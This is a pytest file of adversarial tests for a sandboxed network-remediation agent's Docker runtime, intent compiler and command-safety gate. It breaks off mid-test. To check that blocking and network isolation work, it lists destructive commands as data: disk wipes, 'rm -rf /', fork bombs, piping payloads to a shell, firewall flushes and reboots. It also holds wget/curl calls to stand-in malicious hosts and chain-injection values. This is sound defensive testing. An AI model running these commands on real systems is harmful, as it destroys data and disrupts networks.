"""Empirical Adversarial Stress Tests & Fuzzers for R1 (Sandbox Runtime) & R2 (Intent Compiler).

Milestone 1 & Milestone 2 Adversarial Verification:
1. Docker Sandbox Runtime:
   - Timeout handling and escalation under infinite loops or hanging commands.
   - Resource quotas: extreme boundary values, CPU core scaling, tmpfs, and OOM trapping (exit code 137).
   - Network isolation: attempts to egress or resolve remote endpoints under `--network none`,
     loopback containment, and pass report signature verification under adversarial tampering.
   - Automated Garbage Collection (Auto-GC): sweeping expired vs. fresh containers based on TTL,
     force mode cleanup, dangling image pruning, and Docker outage fault tolerance.
2. Canonical Intent Compiler:
   - Complex multi-step chained remediation plans with mathematically exact reverse topological rollbacks.
   - Platform-specific dependency reversal (e.g. interface unbinding before ACL or classifier removal).
   - Boundary IP prefixes (/0, /8, /12, /16, /24, /32), Cisco/Huawei wildcard masks, boundary ports (1, 65535, 0),
     and malformed/fuzzed input validation.
   - Agent Access Layer (AAL) safety gating: strict interception of table flushes (iptables -F, nft flush),
     system reboots (reboot, init 0, systemctl), interface wipes, fork bombs, and chained command injections.
"""

from __future__ import annotations

import copy
import ipaddress
import json
from pathlib import Path
import time
from typing import Any, Dict, List
from unittest.mock import MagicMock, patch
import pytest

from langgraph_netagent.models.intent import (
    CanonicalIntent,
    CompilationResult,
    IntentAction,
    RollbackStep,
    TargetPlatform,
)
from langgraph_netagent.models.sandbox import (
    GCReport,
    PreflightSandboxPassReport,
    ResourceQuota,
    SandboxExecutionResult,
)
from langgraph_netagent.tools.aal import AALSecurityError, AgentAccessLayer
from langgraph_netagent.tools.base import CommandResult
from langgraph_netagent.tools.intent_compiler import (
    CanonicalIntentCompiler,
    compile_canonical_intent,
    compile_remediation_plan,
)
from langgraph_netagent.tools.mock_engine import MockContainerlabAdapter
from langgraph_netagent.tools.runner import SubprocessRunner
from langgraph_netagent.tools.sandbox import ShadowSandboxManager
from langgraph_netagent.tools.sandbox_runtime import (
    AutoGarbageCollector,
    DockerRuntimeError,
    DockerSandboxRuntime,
    DockerUnavailableError,
    MockSandboxRuntime,
    create_sandbox_runtime,
)


# =============================================================================
# Fixtures & Helpers
# =============================================================================

@pytest.fixture
def mock_adapter():
    """Create a mock network lab adapter."""
    adapter = MockContainerlabAdapter()
    for candidate in [
        Path(__file__).resolve().parent.parent / "clab_output" / "netagent-lab.clab.yml",
        Path(__file__).resolve().parent.parent.parent / "clab_output" / "netagent-lab.clab.yml",
    ]:
        if candidate.exists():
            adapter.deploy(candidate)
            break
    return adapter


@pytest.fixture
def aal_instance(mock_adapter):
    """Instantiate Agent Access Layer with mock adapter."""
    return AgentAccessLayer(lab_adapter=mock_adapter)


@pytest.fixture
def compiler():
    """Instantiate standard canonical intent compiler."""
    return CanonicalIntentCompiler(strict_safety=True)


def cmd_res(command: str, exit_code: int, stdout: str = "", stderr: str = "", duration: float = 0.1) -> CommandResult:
    """Helper creating valid CommandResult objects."""
    return CommandResult(
        command=command,
        exit_code=exit_code,
        stdout=stdout,
        stderr=stderr,
        duration_seconds=duration,
    )


# =============================================================================
# PART 1: Sandbox Runtime Adversarial Stress Tests (M1 - R1)
# =============================================================================

class TestAdversarialSandboxTimeoutEscalation:
    """Stress-test timeout handling, hanging processes, and exit code capture."""

    def test_mock_sandbox_infinite_sleep_timeout(self):
        """Verify that hanging sleep commands trigger timeout exit code (-1) and timed_out flag."""
        runtime = MockSandboxRuntime(target_node="dc-egress")
        with runtime:
            res = runtime.exec_command("sleep 999", timeout=10)
            assert res.timed_out is True
            assert res.exit_code == -1
            assert res.success is False
            assert "timed out" in res.stderr.lower()
            assert res.duration_sec == 10.0

    def test_mock_sandbox_while_loop_timeout(self):
        """Verify that infinite CPU loop commands trigger timeout trapping."""
        runtime = MockSandboxRuntime(target_node="dc-egress")
        with runtime:
            res = runtime.exec_command("while true; do :; done", timeout=5)
            assert res.timed_out is True
            assert res.exit_code == -1
            assert res.success is False
            assert res.duration_sec == 5.0

    def test_mock_sandbox_explicit_timeout_tag(self):
        """Verify that commands labeled with timeout_test trigger timeout flag."""
        runtime = MockSandboxRuntime(target_node="dc-egress")
        with runtime:
            res = runtime.exec_command("echo test && timeout_test", timeout=3)
            assert res.timed_out is True
            assert res.exit_code == -1
            assert res.success is False

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_docker_sandbox_timeout_escalation_captured(self, mock_docker_avail):
        """Verify DockerSandboxRuntime maps runner timeout into SandboxExecutionResult."""
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker run", 0, "container-xyz"),
            cmd_res("docker exec", -1, "", "Command timed out after 15 seconds"),
            cmd_res("docker rm", 0, ""),
        ]

        runtime = DockerSandboxRuntime(
            target_node="dc-egress",
            runner=mock_runner,
            sandbox_id="sbx-timeout-1",
        )
        with runtime:
            res = runtime.exec_command("sleep 100", timeout=15)
            assert res.timed_out is True
            assert res.exit_code == -1
            assert res.success is False
            assert "timed out" in res.stderr.lower()

    def test_preflight_verification_aborts_on_timeout(self, mock_adapter, aal_instance):
        """Verify preflight verification halts pipeline and marks report as failed when command times out."""
        report = ShadowSandboxManager.run_preflight_verification(
            node_name="dc-egress",
            commands=[
                "iptables -I FORWARD -s 10.0.0.5 -j DROP",
                "sleep 999",  # Hanging step
                "iptables -I FORWARD -s 10.0.0.6 -j DROP",
            ],
            adapter=mock_adapter,
            aal=aal_instance,
            timeout=5,
        )
        assert report.all_passed is False
        assert -1 in report.exit_codes
        # Should short-circuit and not execute the 3rd command
        assert len(report.commands_executed) == 2
        assert report.verify_clean_pass() is False


class TestAdversarialSandboxResourceQuotas:
    """Stress-test cgroups CPU, memory, PIDs resource quotas and OOM trapping."""

    def test_resource_quota_boundary_values(self):
        """Test extreme boundary quotas (micro-limits vs mega-limits)."""
        # Micro limits
        micro_quota = ResourceQuota(
            nano_cpus=50_000_000,   # 0.05 core
            mem_limit="16m",
            pids_limit=5,
            tmpfs_size="8m",
        )
        flags = micro_quota.to_docker_flags()
        assert "--cpus=0.05" in flags
        assert "--memory=16m" in flags
        assert "--memory-swap=16m" in flags
        assert "--pids-limit=5" in flags
        assert "--tmpfs=/tmp:rw,size=8m,mode=1777" in flags

        d_micro = micro_quota.to_dict()
        assert d_micro["cpu_limit"] == "0.1" or float(d_micro["cpu_limit"]) <= 0.1
        assert d_micro["mem_limit"] == "16m"
        assert d_micro["pids_limit"] == 5

        # Massive limits
        mega_quota = ResourceQuota(
            nano_cpus=64_000_000_000,  # 64 cores
            mem_limit="128g",
            pids_limit=50000,
            tmpfs_size="10g",
        )
        mega_flags = mega_quota.to_docker_flags()
        assert "--cpus=64" in mega_flags
        assert "--memory=128g" in mega_flags
        assert "--pids-limit=50000" in mega_flags

    def test_mock_sandbox_oom_bomb_trapping(self):
        """Verify memory exhaustion / OOM bombs are trapped with exit code 137 (SIGKILL)."""
        runtime = MockSandboxRuntime(target_node="dc-egress")
        with runtime:
            # Test stress --vm pattern
            res_stress = runtime.exec_command("stress --vm 2 --vm-bytes 1G")
            assert res_stress.exit_code == 137
            assert res_stress.success is False
            assert "out of memory" in res_stress.stderr.lower()

            # Test Python memory bomb pattern
            res_py = runtime.exec_command("python3 -c '[0]*(10**9)'")
            assert res_py.exit_code == 137
            assert res_py.success is False

            # Test oom_bomb tag
            res_tag = runtime.exec_command("run_oom_bomb_test")
            assert res_tag.exit_code == 137
            assert res_tag.success is False

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_docker_sandbox_oom_execution_handling(self, mock_docker_avail):
        """Verify DockerSandboxRuntime properly captures exit code 137 from container."""
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker run", 0, "container-oom"),
            cmd_res("docker exec", 137, "", "Killed (Out of memory)"),
            cmd_res("docker rm", 0, ""),
        ]

        runtime = DockerSandboxRuntime(
            target_node="dc-egress",
            runner=mock_runner,
            sandbox_id="sbx-oom-1",
        )
        with runtime:
            res = runtime.exec_command("stress --vm 1 --vm-bytes 2G")
            assert res.exit_code == 137
            assert res.success is False
            assert "out of memory" in res.stderr.lower() or "killed" in res.stderr.lower()

    def test_preflight_verification_fails_on_oom(self, mock_adapter, aal_instance):
        """Preflight validation must trap OOM and fail cleanly without throwing unhandled exceptions."""
        report = ShadowSandboxManager.run_preflight_verification(
            node_name="dc-egress",
            commands=[
                "iptables -I FORWARD -j DROP",
                "stress --vm 1 --vm-bytes 1G",  # OOM step
            ],
            adapter=mock_adapter,
            aal=aal_instance,
        )
        assert report.all_passed is False
        assert 137 in report.exit_codes
        assert report.verify_clean_pass() is False


class TestAdversarialSandboxNetworkIsolation:
    """Stress-test strict `--network none` isolation and bypass attempts."""

    def test_mock_sandbox_remote_egress_blocked(self):
        """Verify outbound network egress attempts fail immediately with exit code 2."""
        runtime = MockSandboxRuntime(target_node="dc-egress", network_mode="none")
        with runtime:
            # Remote ICMP ping
            res_ping = runtime.exec_command("ping 8.8.8.8")
            assert res_ping.exit_code == 2
            assert res_ping.success is False
            assert "network is unreachable" in res_ping.stderr.lower()

            res_ping_c = runtime.exec_command("ping -c 3 192.168.1.1")
            assert res_ping_c.exit_code == 2

            # Remote HTTP curl
            res_curl = runtime.exec_command("curl http://1.1.1.1/exploit")
            assert res_curl.exit_code == 2
            assert "network is unreachable" in res_curl.stderr.lower()

            # Remote wget
            res_wget = runtime.exec_command("wget http://malicious.org/payload.sh")
            assert res_wget.exit_code == 2

            # Netcat socket probe
            res_nc = runtime.exec_command("nc -zv 10.0.0.1 80")
            assert res_nc.exit_code == 2

    def test_mock_sandbox_loopback_allowed(self):
        """Loopback address (127.0.0.1/localhost) remains reachable inside isolated namespace."""
        runtime = MockSandboxRuntime(target_node="dc-egress", network_mode="none")
        with runtime:
            res_lo = runtime.exec_command("ping -c 1 127.0.0.1")
            assert res_lo.exit_code == 0
            assert res_lo.success is True
            assert "127.0.0.1" in res_lo.stdout

            res_host = runtime.exec_command("ping localhost")
            assert res_host.exit_code == 0

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_docker_sandbox_startup_enforces_network_none(self, mock_docker_avail):
        """Verify DockerSandboxRuntime strictly passes `--network none` in docker run arguments."""
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker run", 0, "container-net-none"),
            cmd_res("docker rm", 0, ""),
        ]

        runtime = DockerSandboxRuntime(
            target_node="dc-egress",
            runner=mock_runner,
            network_mode="none",
        )
        with runtime:
            pass

        run_call_args = mock_runner.run.call_args_list[0][0][0]
        assert "--network none" in run_call_args
        assert "--privileged" not in run_call_args  # Privilege containment

    def test_preflight_report_fails_if_network_isolation_violated(self):
        """PreflightSandboxPassReport must fail verify_clean_pass() if network_isolated is False."""
        # Clean report
        report = PreflightSandboxPassReport(
            sandbox_id="sbx-net-test",
            target_node="dc-egress",
            commands_executed=["iptables -I FORWARD -j DROP"],
            all_passed=True,
            exit_codes=[0],
            network_isolated=True,
        )
        assert report.verify_clean_pass() is True

        # Tampered report: network_isolated=False
        tampered_report = PreflightSandboxPassReport(
            sandbox_id="sbx-net-test-tampered",
            target_node="dc-egress",
            commands_executed=["iptables -I FORWARD -j DROP"],
            all_passed=True,
            exit_codes=[0],
            network_isolated=False,  # Violation!
        )
        assert tampered_report.verify_clean_pass() is False

    def test_preflight_report_signature_tamper_detection(self):
        """Any tampering with commands_executed or exit_codes after signing must invalidate pass."""
        report = PreflightSandboxPassReport(
            sandbox_id="sbx-sig-test",
            target_node="dc-egress",
            commands_executed=["iptables -I FORWARD -s 10.0.0.1 -j DROP"],
            all_passed=True,
            exit_codes=[0],
            network_isolated=True,
        )
        assert report.pass_signature != ""
        assert report.verify_clean_pass() is True

        # Tamper 1: change executed command
        report.commands_executed.append("iptables -F")
        assert report.verify_clean_pass() is False

        # Reset and tamper 2: change exit code
        report.commands_executed = ["iptables -I FORWARD -s 10.0.0.1 -j DROP"]
        report.exit_codes = [1]
        assert report.verify_clean_pass() is False


class TestAdversarialAutoGarbageCollection:
    """Stress-test Auto-GC sweeper with varied TTL thresholds, orphaned containers, and dangling images."""

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_gc_ttl_boundary_sweeping(self, mock_docker_avail):
        """Test container pruning based on exact TTL age boundary."""
        now_ts = int(time.time())
        docker_ps_output = (
            f"c_800|sbx-800|netops.sandbox=true,netops.sandbox.created_at={now_ts - 800}\n"
            f"c_300|sbx-300|netops.sandbox=true,netops.sandbox.created_at={now_ts - 300}\n"
            f"c_601|sbx-601|netops.sandbox=true,netops.sandbox.created_at={now_ts - 601}\n"
            f"c_599|sbx-599|netops.sandbox=true,netops.sandbox.created_at={now_ts - 599}\n"
            f"c_nolabel|sbx-nolabel|netops.sandbox=true\n"
        )

        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker ps", 0, docker_ps_output),
            cmd_res("docker rm c_800", 0, ""),
            cmd_res("docker rm c_601", 0, ""),
            cmd_res("docker images", 0, ""),
        ]

        gc = AutoGarbageCollector(runner=mock_runner)
        report = gc.run_gc(ttl_seconds=600, force=False)

        assert "sbx-800" in report.containers_removed
        assert "sbx-601" in report.containers_removed
        assert "sbx-300" not in report.containers_removed
        assert "sbx-599" not in report.containers_removed
        assert "sbx-nolabel" not in report.containers_removed
        assert len(report.containers_removed) == 2
        assert report.scanned_containers_count == 5

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_gc_force_sweep_removes_all_labeled(self, mock_docker_avail):
        """When force=True, all labeled containers are removed regardless of creation time."""
        now_ts = int(time.time())
        docker_ps_output = (
            f"c_recent|sbx-recent|netops.sandbox=true,netops.sandbox.created_at={now_ts - 10}\n"
            f"c_old|sbx-old|netops.sandbox=true,netops.sandbox.created_at={now_ts - 9999}\n"
        )
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker ps", 0, docker_ps_output),
            cmd_res("docker rm c_recent", 0, ""),
            cmd_res("docker rm c_old", 0, ""),
            cmd_res("docker images", 0, ""),
        ]

        gc = AutoGarbageCollector(runner=mock_runner)
        report = gc.run_gc(ttl_seconds=600, force=True)

        assert len(report.containers_removed) == 2
        assert "sbx-recent" in report.containers_removed
        assert "sbx-old" in report.containers_removed

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_gc_dangling_images_pruned_with_dedup(self, mock_docker_avail):
        """Verify dangling image IDs are deduplicated and pruned with a single command."""
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker ps", 0, ""),
            cmd_res("docker images -q", 0, "sha256:img1\nsha256:img2\nsha256:img1\n"),
            cmd_res("docker rmi -f", 0, "Deleted: img1"),
        ]

        gc = AutoGarbageCollector(runner=mock_runner)
        report = gc.run_gc(ttl_seconds=600)

        assert len(report.images_pruned) == 2
        assert "sha256:img1" in report.images_pruned
        assert "sha256:img2" in report.images_pruned

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_gc_resilience_to_docker_errors(self, mock_docker_avail):
        """Auto-GC must handle partial removal failures gracefully without crashing."""
        docker_ps_output = "c_fail|sbx-fail|netops.sandbox=true\nc_ok|sbx-ok|netops.sandbox=true\n"
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            cmd_res("docker ps", 0, docker_ps_output),
            cmd_res("docker rm c_fail", 1, "", "Error response from daemon: container is paused"),
            cmd_res("docker rm c_ok", 0, ""),
            cmd_res("docker images", 0, ""),
        ]

        gc = AutoGarbageCollector(runner=mock_runner)
        report = gc.run_gc(force=True)

        assert "sbx-ok" in report.containers_removed
        assert len(report.errors) == 1
        assert "container is paused" in report.errors[0]

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=False)
    def test_gc_docker_unavailable_returns_error_report(self, mock_docker_avail):
        """When Docker daemon is unavailable, run_gc returns error report without unhandled crash."""
        gc = AutoGarbageCollector()
        report = gc.run_gc()

        assert len(report.containers_removed) == 0
        assert len(report.images_pruned) == 0
        assert len(report.errors) == 1
        assert "unavailable" in report.errors[0].lower()


# =============================================================================
# PART 2: Canonical Intent Compiler Adversarial Stress Tests (M2 - R2)
# =============================================================================

class TestAdversarialIntentCompilerRollbackSequencing:
    """Stress-test complex multi-step composite rollback order and platform-specific dependencies."""

    def test_composite_plan_global_reverse_topological_order(self, compiler):
        """A composite plan must strictly reverse the sequence of intents during rollback."""
        intents = [
            # Step 1: Drop offending IP
            CanonicalIntent(
                intent_id="step1",
                action=IntentAction.DROP_TRAFFIC,
                target_node="dc-egress",
                target_platform=TargetPlatform.LINUX_IPTABLES,
                source_ip="192.168.10.100",
                destination_port=80,
            ),
            # Step 2: Rate limit traffic
            CanonicalIntent(
                intent_id="step2",
                action=IntentAction.RATE_LIMIT,
                target_node="dc-egress",
                target_platform=TargetPlatform.LINUX_IPTABLES,
                interface="eth1",
                rate_limit_kbps=5000,
                extra_params={"method": "tc"},
            ),
            # Step 3: Reroute prefix to blackhole/gateway
            CanonicalIntent(
                intent_id="step3",
                action=IntentAction.RESTORE_ROUTE,
                target_node="dc-egress",
                target_platform=TargetPlatform.LINUX_IPTABLES,
                network_prefix="10.50.0.0/16",
                next_hop="10.0.0.1",
            ),
            # Step 4: Clear another obsolete filter
            CanonicalIntent(
                intent_id="step4",
                action=IntentAction.CLEAR_FILTER,
                target_node="dc-egress",
                target_platform=TargetPlatform.LINUX_IPTABLES,
                source_ip="172.16.1.1",
            ),
        ]

        composite = compiler.compile_composite_plan(intents)
        assert composite.is_safe is True
        assert len(composite.forward_commands) >= 4

        # Verify global reverse order: Step 4 rollback -> Step 3 rollback -> Step 2 rollback -> Step 1 rollback
        rollback_cmds = composite.rollback_commands
        # Step 4 rollback: iptables -I FORWARD -s 172.16.1.1 -j DROP
        assert "172.16.1.1" in rollback_cmds[0]
        # Step 3 rollback: ip route del 10.50.0.0/16 via 10.0.0.1
        assert "ip route del 10.50.0.0/16" in rollback_cmds[1]
        # Step 2 rollback: tc qdisc del dev eth1 root
        assert "tc qdisc del dev eth1" in rollback_cmds[2]
        # Step 1 rollback: iptables -D FORWARD -s 192.168.10.100
        assert "192.168.10.100" in rollback_cmds[3]

        # Verify sequential 1-based indexing of rollback steps
        for idx, step in enumerate(composite.rollback_steps, start=1):
            assert step.step_number == idx
            assert step.step_order == idx

    def test_cisco_acl_interface_unbinding_precedes_acl_deletion(self, compiler):
        """In Cisco ACL rollback, the interface access-group must be removed BEFORE deleting the ACL."""
        intent = CanonicalIntent(
            intent_id="cisco-drop-1",
            action=IntentAction.DROP_TRAFFIC,
            target_node="edge-router",
            target_platform=TargetPlatform.CISCO_ACL,
            source_ip="10.99.1.5",
            destination_ip="10.0.0.1",
            interface="GigabitEthernet0/1",
            extra_params={"acl_name": "ACL_TEST_REV"},
        )
        res = compiler.compile(intent)
        assert res.is_safe is True

        rb = res.rollback_commands
        # Expected rollback sequence:
        # 1. interface GigabitEthernet0/1
        # 2. no ip access-group ACL_TEST_REV in
        # 3. no ip access-list extended ACL_TEST_REV
        assert len(rb) == 3
        assert rb[0] == "interface GigabitEthernet0/1"
        assert rb[1] == "no ip access-group ACL_TEST_REV in"
        assert rb[2] == "no ip access-list extended ACL_TEST_REV"

    def test_cisco_qos_interface_unbinding_precedes_policymap_deletion(self, compiler):
        """In Cisco QoS rollback, service-policy must be removed from interface before policy-map deletion."""
        intent = CanonicalIntent(
            intent_id="cisco-qos-1",
            action=IntentAction.RATE_LIMIT,
            target_node="edge-router",
            target_platform=TargetPlatform.CISCO_ACL,
            interface="GigabitEthernet0/2",
            rate_limit_kbps=2000,
            extra_params={"policy_name": "QOS_TEST"},
        )
        res = compiler.compile(intent)
        assert res.is_safe is True

        rb = res.rollback_commands
        assert len(rb) == 3
        assert rb[0] == "interface GigabitEthernet0/2"
        assert rb[1] == "no service-policy input QOS_TEST"
        assert rb[2] == "no policy-map QOS_TEST"

    def test_huawei_vrp_5_tier_hierarchy_reverse_unbinding(self, compiler):
        """Huawei VRP rollback must follow strict 5-tier reverse hierarchy:
        Interface -> Traffic Policy -> Traffic Behavior -> Traffic Classifier -> ACL."""
        intent = CanonicalIntent(
            intent_id="hw-drop-1",
            action=IntentAction.DROP_TRAFFIC,
            target_node="hw-switch",
            target_platform=TargetPlatform.HUAWEI_VRP,
            source_ip="192.168.10.50",
            interface="GigabitEthernet0/0/1",
            extra_params={
                "acl_number": 3500,
                "classifier_name": "tc_drop_50",
                "behavior_name": "tb_drop_50",
                "policy_name": "tp_drop_50",
            },
        )
        res = compiler.compile(intent)
        assert res.is_safe is True

        rb = res.rollback_commands
        # Check reverse order:
        assert rb[0] == "interface GigabitEthernet0/0/1"
        assert rb[1] == "undo traffic-policy tp_drop_50 inbound"
        assert rb[2] == "undo traffic policy tp_drop_50"
        assert rb[3] == "undo traffic behavior tb_drop_50"
        assert rb[4] == "undo traffic classifier tc_drop_50"
        assert rb[5] == "undo acl number 3500"

    def test_linux_tc_rate_limit_rollback_unbinding(self, compiler):
        """Linux tc rollback must delete the qdisc root to clean up all attached classes."""
        intent = CanonicalIntent(
            intent_id="tc-rate-1",
            action=IntentAction.RATE_LIMIT,
            target_node="host1",
            target_platform=TargetPlatform.LINUX_IPTABLES,
            interface="eth2",
            rate_limit_kbps=10000,
            extra_params={"method": "tc"},
        )
        res = compiler.compile(intent)
        assert res.is_safe is True
        assert res.rollback_commands == ["tc qdisc del dev eth2 root"]


class TestAdversarialIntentCompilerBoundaryAndFuzzing:
    """Stress-test boundary IP prefixes, wildcards, ports, and malformed inputs."""

    def test_boundary_ip_prefixes_and_wildcard_conversions(self, compiler):
        """Verify parsing of /0, /8, /12, /16, /24, /32 across Cisco, Huawei, and FRR."""
        test_cases = [
            # (ip_str, expected_net, expected_netmask, expected_wildcard)
            ("0.0.0.0/0", "0.0.0.0", "0.0.0.0", "255.255.255.255"),
            ("10.0.0.0/8", "10.0.0.0", "255.0.0.0", "0.255.255.255"),
            ("172.16.0.0/12", "172.16.0.0", "255.240.0.0", "0.15.255.255"),
            ("192.168.1.0/24", "192.168.1.0", "255.255.255.255".replace("255.255.255.255", "255.255.255.0"), "0.0.0.255"),
            ("192.168.1.5/32", "192.168.1.5", "255.255.255.255", "0.0.0.0"),
            ("192.168.1.5", "192.168.1.5", "255.255.255.255", "0.0.0.0"),
        ]

        for ip_str, exp_net, exp_mask, exp_wild in test_cases:
            net_addr, netmask, wildcard = compiler.parse_network(ip_str)
            assert net_addr == exp_net
            assert netmask == exp_mask
            assert wildcard == exp_wild

    def test_cisco_wildcard_clause_formatting(self, compiler):
        """Verify Cisco IP clauses format correctly: 'any', 'host X', or 'net wildcard'."""
        assert compiler._cisco_ip_clause("any") == "any"
        assert compiler._cisco_ip_clause("0.0.0.0/0") == "any"
        assert compiler._cisco_ip_clause(None) == "any"
        assert compiler._cisco_ip_clause("10.1.1.1/32") == "host 10.1.1.1"
        assert compiler._cisco_ip_clause("10.1.1.1") == "host 10.1.1.1"
        assert compiler._cisco_ip_clause("10.1.0.0/16") == "10.1.0.0 0.0.255.255"

    def test_huawei_wildcard_clause_formatting(self, compiler):
        """Verify Huawei IP clauses format correctly: empty for any, 'net 0' for host, 'net wildcard' for subnet."""
        assert compiler._huawei_ip_clause("any", is_source=True) == ""
        assert compiler._huawei_ip_clause("0.0.0.0/0", is_source=True) == ""
        assert compiler._huawei_ip_clause(None, is_source=True) == ""
        assert compiler._huawei_ip_clause("10.2.2.2/32", is_source=True) == " source 10.2.2.2 0"
        assert compiler._huawei_ip_clause("10.2.0.0/16", is_source=False) == " destination 10.2.0.0 0.0.255.255"

    def test_frr_cidr_clause_formatting(self, compiler):
        """Verify FRR clauses preserve CIDR or append /32 for single host."""
        assert compiler._frr_cidr_clause("any") == "any"
        assert compiler._frr_cidr_clause(None) == "any"
        assert compiler._frr_cidr_clause("10.3.3.3/32") == "10.3.3.3/32"
        assert compiler._frr_cidr_clause("10.3.3.3") == "10.3.3.3/32"
        assert compiler._frr_cidr_clause("10.3.0.0/16") == "10.3.0.0/16"

    def test_boundary_ports_compilation(self, compiler):
        """Verify boundary port numbers (1, 65535, 0, None) compile properly."""
        # Port 1 (min valid)
        intent_min = CanonicalIntent(
            action=IntentAction.DROP_TRAFFIC,
            target_node="dc-egress",
            target_platform=TargetPlatform.LINUX_IPTABLES,
            source_port=1,
            destination_port=65535,
        )
        res_min = compiler.compile(intent_min)
        assert "--sport 1" in res_min.forward_commands[0]
        assert "--dport 65535" in res_min.forward_commands[0]

        # Port 0 or None -> omitted without error
        intent_none = CanonicalIntent(
            action=IntentAction.DROP_TRAFFIC,
            target_node="dc-egress",
            target_platform=TargetPlatform.LINUX_IPTABLES,
            source_port=0,
            destination_port=None,
        )
        res_none = compiler.compile(intent_none)
        assert "--sport" not in res_none.forward_commands[0]
        assert "--dport" not in res_none.forward_commands[0]

    def test_malformed_ip_fuzzing_raises_error(self, compiler):
        """Fuzzed or invalid IP addresses must raise ValueError rather than produce invalid CLI syntax."""
        fuzzed_ips = [
            "999.999.999.999",
            "10.0.0.1/33",
            "10.0.0.1/-1",
            "not-an-ip-address",
            "192.168.1.1.1",
            "1.2.3.4/abc",
        ]

        for bad_ip in fuzzed_ips:
            with pytest.raises(ValueError):
                compiler.parse_network(bad_ip)

            # Route compilation should raise ValueError when given malformed network prefix
            intent = CanonicalIntent(
                action=IntentAction.RESTORE_ROUTE,
                target_node="r1",
                target_platform=TargetPlatform.CISCO_ACL,
                network_prefix=bad_ip,
                next_hop="10.0.0.1",
            )
            with pytest.raises(ValueError):
                compiler.compile(intent)

    def test_route_intent_missing_next_hop_raises_value_error(self, compiler):
        """Route operations must reject missing next_hop with ValueError across all platforms."""
        for plat in [TargetPlatform.LINUX_IPTABLES, TargetPlatform.CISCO_ACL, TargetPlatform.HUAWEI_VRP, TargetPlatform.LINUX_FRR]:
            intent = CanonicalIntent(
                action=IntentAction.RESTORE_ROUTE,
                target_node="r1",
                target_platform=plat,
                network_prefix="10.0.0.0/24",
                next_hop=None,  # Missing!
            )
            with pytest.raises(ValueError, match=r"next_hop"):
                compiler.compile(intent)

    def test_compile_composite_plan_empty_raises_value_error(self, compiler):
        """Compiling an empty list of intents must raise ValueError."""
        with pytest.raises(ValueError, match="Cannot compile empty intent list"):
            compiler.compile_composite_plan([])


class TestAdversarialAALSecurityGating:
    """Stress-test AAL safety gating blocking table flushes, reboots, wipes, and injection attacks."""

    def test_aal_blocks_table_flushes_directly(self, aal_instance):
        """Verify AAL validate_command_safety blocks all table and ruleset flushes."""
        flush_commands = [
            "iptables -F",
            "iptables --flush",
            "iptables -t nat -F",
            "iptables -X",
            "iptables --delete-chain",
            "ip6tables -F",
            "nft flush ruleset",
            "nft flush table filter",
        ]

        for cmd in flush_commands:
            is_safe, reason = aal_instance.validate_command_safety(cmd)
            assert is_safe is False, f"Expected {cmd} to be blocked!"
            assert "flush" in reason.lower() or "blocked" in reason.lower()

    def test_aal_blocks_system_reboots_and_poweroffs(self, aal_instance):
        """Verify AAL blocks system reboot, halt, shutdown, and init level changes."""
        reboot_commands = [
            "reboot",
            "reboot -f",
            "poweroff",
            "halt",
            "shutdown",
            "shutdown -h now",
            "init 0",
            "init 6",
            "telinit 0",
            "systemctl reboot",
            "systemctl poweroff",
        ]

        for cmd in reboot_commands:
            is_safe, reason = aal_instance.validate_command_safety(cmd)
            assert is_safe is False, f"Expected {cmd} to be blocked!"
            assert "blocked" in reason.lower()

    def test_aal_blocks_interface_flushes_and_deletions(self, aal_instance):
        """Verify AAL blocks full interface address flushes and interface deletions."""
        destructive_iface_cmds = [
            "ip addr flush dev eth1",
            "ip a flush eth0",
            "ifconfig eth1 0.0.0.0",
            "ip link delete eth1",
            "ip link del eth2",
        ]

        for cmd in destructive_iface_cmds:
            is_safe, reason = aal_instance.validate_command_safety(cmd)
            assert is_safe is False, f"Expected {cmd} to be blocked!"
            assert "flush" in reason.lower() or "blocked" in reason.lower()

    def test_aal_blocks_disk_formatting_and_fork_bombs(self, aal_instance):
        """Verify AAL blocks recursive deletions, disk formats, and shell fork bombs."""
        destructive_system_cmds = [
            "rm -rf /",
            "rm -rf /*",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "wipefs -a /dev/sda",
            ":(){ :|:& };:",
            "bomb(){ bomb|bomb& };bomb",
            "echo payload | sh",
            "cat payload.sh | bash",
            "base64 -d | sh",
        ]

        for cmd in destructive_system_cmds:
            is_safe, reason = aal_instance.validate_command_safety(cmd)
            assert is_safe is False, f"Expected {cmd} to be blocked!"
            assert "blocked" in reason.lower()

    def test_compiler_catches_injected_table_flush_via_params(self, compiler):
        """If malicious parameters inject a table flush into compiled commands, compilation flags is_safe=False."""
        # Injecting flush into chain parameter
        intent = CanonicalIntent(
            intent_id="malicious-1",
            action=IntentAction.DROP_TRAFFIC,
            target_node="dc-egress",
            target_platform=TargetPlatform.LINUX_IPTABLES,
            source_ip="10.0.0.1",
            extra_params={"chain": "FORWARD; iptables -F; #"},
        )
        res = compiler.compile(intent, raise_on_unsafe=False)
        assert res.is_safe is False
        assert "flush" in res.validation_error.lower() or "violation" in res.validation_error.lower()

        # With raise_on_unsafe=True, it raises AALSecurityError
        with pytest.raises(AALSecurityError):
            compiler.compile(intent, raise_on_unsafe=True)

    def test_compiler_catches_chained_reboot_injection(self, compiler):
        """Chained command injection (e.g. '; reboot') must be split and intercepted by compiler."""
        intent = CanonicalIntent(
            intent_id="malicious-2",
            action=IntentAction.DROP_TRAFFIC,
